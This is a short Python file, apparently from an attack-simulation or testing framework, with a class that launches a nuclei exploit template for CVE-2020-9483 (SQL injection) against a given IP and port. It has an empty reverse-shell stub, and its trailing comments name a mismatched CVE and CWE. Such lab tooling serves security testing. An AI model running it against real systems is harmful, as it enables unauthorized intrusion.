from attackerBase import *
from attackConfig import *



class SQLI_CVE_2020_9483_Attacker3(AttackerBase):
    
    def __init__(self, ip_addr, yaml_path):
        self.ip_addr = ip_addr
        self.yaml_path = yaml_path
        self.commandRunner = CommandRunner()

    def discovery(self) -> None:
        pass

    def main(self):
        self.commandRunner.runCommand('nuclei -u http://' + self.ip_addr +':30005 -t ' + self.yaml_path + 'YAMLs/CVE-2020-9483_payload2.yaml -silent')

    def reverseShell(self):
        pass
       


if __name__ == '__main__':
    
    # Call your custom attacks here
    pass

  
# CWE-78
# CVE-2019-7543
# IP
# PORT
# IMAGE: 
# 

# MAIN YAML PATH:
# MAIN YAML AUTHOR:
# MAIN YAML SOURCE:
